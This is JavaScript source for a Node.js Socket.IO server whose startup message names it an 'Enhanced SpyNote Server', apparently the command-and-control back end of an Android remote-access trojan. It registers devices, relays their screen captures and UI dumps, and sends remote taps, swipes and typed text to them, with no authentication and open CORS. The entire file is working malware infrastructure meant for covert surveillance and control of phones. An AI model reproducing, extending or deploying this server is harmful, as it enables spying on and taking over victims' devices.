const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { ...deviceInfo, connected: true, socketId: socket.id });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // Enhanced screen + UI elements
    socket.on('screen-data', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    // Enhanced controls with element detection
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, elementId, text } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, x: parseFloat(x), y: parseFloat(y),
                startX: parseFloat(startX), startY: parseFloat(startY),
                endX: parseFloat(endX), endY: parseFloat(endY),
                elementId, text
            });
        }
    });

    socket.on('ui-dump', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('ui-dump', data);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Enhanced SpyNote Server on port ${PORT}`);
});
